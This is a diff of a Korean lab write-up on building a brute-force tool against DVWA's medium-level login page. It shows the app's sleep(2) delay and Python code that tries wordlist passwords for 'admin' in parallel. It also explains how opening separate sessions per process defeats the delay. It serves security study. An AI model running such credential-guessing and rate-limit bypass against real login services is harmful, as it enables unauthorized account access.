@@ -164,10 +164,83 @@ CAPTCHA의 종류로는 **텍스트, 오디오, 이미지, 슬라이드 등**의
 <br/>
 
 그러나 이런 CAPTCHA와 같은 대응방안에 대해서는 한계점이 존재한다. 검증과정중 사람이 직접 개입을 해 해독을 하면 검증을 통과할수밖에 없고, 현재 기술이 발달하면서 텍스트CAPTCHA는 기계들도 충분히 판독이 가능해졌다. 반면에 특정한 장애가 있는 사람들이나 어린이, 노인 등의 접근을 방해하는 역효과 까지 일어난다.
+
+
 # 4. 툴 제작
+툴 제작은 level low단계에서는 brut force에 대한 시큐어 코딩이 되있지 않으므로 넘어가고 level medium에서의 시간 지연 대응에 대한 우회하는 코드 작성을 목표로 하겠다.
+```php
+if( $result && mysqli_num_rows( $result ) == 1 ) {
+        // Get users details
+        $row    = mysqli_fetch_assoc( $result );
+        $avatar = $row["avatar"];
+
+        // Login successful
+        echo "<p>Welcome to the password protected area {$user}</p>";
+        echo "<img src=\"{$avatar}\" />";
+    }
+    else {
+        // Login failed
+        sleep( 2 );
+        echo "<pre><br />Username and/or password incorrect.</pre>";
+    }
+```
+위 코드는 DVWA brut force medium level에서 login에 실패할 경우 sleep(2)를 넣어줌으로 써 로그인 요청에 대한 시간 지연을 발생시키는 코드이다.
+<br/>
+<br/>
+
+
 [https://github.com/Jimin0605/DVWA_tools/blob/main/tools/BrutForce_ver_1.1.py](https://github.com/Jimin0605/DVWA_tools/blob/main/tools/BrutForce_ver_1.1.py)
 
-**전체코드**
+
+**ver 1 code 중**
+
+```python
+url = "http://localhost/vulnerabilities/brute/"
+cookie = "sqv78s0cmf06s3da5nqu4du4t"
+level = "medium"
+head = {"PHPSESSID":f"{cookie}", "security":f"{level}"}
+
+def brut_force(passwordList):
+    global url
+    global head
+    for password in passwordList:
+        param = f"?username=admin&password={password}&Login=Login"
+        payload = url+param
+        response = requests.get(payload, cookies=head)
+        if "login_logo.png" in response.text:
+            print("Connection failed..")
+            break
+        else:
+            print("input password:", password)
+
+        if (response.status_code == 200 and 'Welcome to the password protected area' in response.text):
+            return password
+    return None
+
+
+# # TEST 병렬처리O
+if __name__ == '__main__':
+    start = int(time.time())
+    num_cores = 8
+    pool = Pool(num_cores)
+    filename = 'tools/passwordlist.txt'
+    tasks = read_file(filename)
+    results = pool.map(brut_force, tasks)
+    end = int(time.time())
+
+    for result in results:
+        if result:
+            print("password is:",result)
+    print(f"걸린시간: {end-start}sec.")
+
+```
+처음 툴을 제작할 때 처음 완성이 됬던 github link에 있는 brut force ver 1을 실행을 했을 때 input을 했던 password 들이 처음에는 8개(core의 수를 8개로 설정해 두었음)로 나왔지만 이후로는 시간이 조금 흐른뒤 password input이 하나 나오고 이후로는 약 2초 간격으로 input이 하나씩 되는 것을 확인 할 수 있었다. 즉, medium난이도의 brut force에서 sleep(2)라는 http요청의 시간지연을 우회하기 위해 pyhton에서 제공하는 multiprocessing모듈에서 Pool을 이용해 병렬처리를 해주었지만 실패를 했다.
+
+실패의 원인을 분석해보았을 때 함수를 실행할 때에는 병렬 처리가 잘 되었지만 요청을 보내는 부분에서 문제가 있던것이었다. requests.get으로 요청을 보낼 때 아무리 요청을 8개를 보내도 처음 받은 요청으로 인해 2초씩 시간지연이 발생하기 때문이다. 원래라면 요청 8개를 보냈을 때 서로 독립적으로 응답을 받고 2초씩 시간 지연이 생기는 방식으로 되어야 하는데 각 코어의 요청이 독립적으로 요청을 보내고 있지 않기에 이런 문제가 발생한 것이었다.
+
+이것을 해결하기 위해 한개의 로그인상태가 아닌 각각의 세션들을 만들어 요청을 보내기위해 session_set이라는 함수를 만들어 로그인을 할 때 필요한 파라미터인 username과 password, Login은 각각 admin, password, Login으로 입력해주고 user_token은 BeautifulSoup을 이용해 token을 가져와 입력을 하게 해주었다. 그리고 login폼에 post요청으로 login_info와 함께 요청을 보내주면 새로운 세션이 만들어진다. brut force 함수를 실행 할 때 8개의 코어로 나누어 실행하므로써 각각의 새로운 세션이 만들어지고 이를통해 서로 독립적으로 요청이 보내져 한번에 8개의 password값을 입력할 수 있게 되는것이다.
+
+**ver 1.1 code**
 ```python
 '''
 brut force 병렬처리 성공
@@ -252,13 +325,6 @@ if __name__ == '__main__':
             print("\n\nBruteforce SUCCESS!!")
             print("password is", result)
 ```
-
-
-처음 툴을 제작할 때 처음 완성이 됬던 github link에 있는 brut force ver 1을 실행을 했을 때 input을 했던 password 들이 처음에는 8개(core의 수를 8개로 설정해 두었음)로 나왔지만 이후로는 시간이 조금 흐른뒤 password input이 하나 나오고 이후로는 약 2초 간격으로 input이 하나씩 되는 것을 확인 할 수 있었다. 즉, medium난이도의 brut force에서 sleep(2)라는 http요청의 시간지연을 우회하기 위해 pyhton에서 제공하는 multiprocessing모듈에서 Pool을 이용해 병렬처리를 해주었지만 실패를 했다.
-
-실패의 원인을 분석해보았을 때 함수를 실행할 때에는 병렬 처리가 잘 되었지만 요청을 보내는 부분에서 문제가 있던것이었다. requests.get으로 요청을 보낼 때 아무리 요청을 8개를 보내도 처음 받은 요청으로 인해 2초씩 시간지연이 발생하기 때문이다. 원래라면 요청 8개를 보냈을 때 서로 독립적으로 응답을 받고 2초씩 시간 지연이 생기는 방식으로 되어야 하는데 각 코어의 요청이 독립적으로 요청을 보내고 있지 않기에 이런 문제가 발생한 것이었다.
-
-이것을 해결하기 위해 한개의 로그인상태가 아닌 각각의 세션들을 만들어 요청을 보내기위해 session_set이라는 함수를 만들어 로그인을 할 때 필요한 파라미터인 username과 password, Login은 각각 admin, password, Login으로 입력해주고 user_token은 BeautifulSoup을 이용해 token을 가져와 입력을 하게 해주었다. 그리고 login폼에 post요청으로 login_info와 함께 요청을 보내주면 새로운 세션이 만들어진다. brut force 함수를 실행 할 때 8개의 코어로 나누어 실행하므로써 각각의 새로운 세션이 만들어지고 이를통해 서로 독립적으로 요청이 보내져 한번에 8개의 password값을 입력할 수 있게 되는것이다.
 
 
 
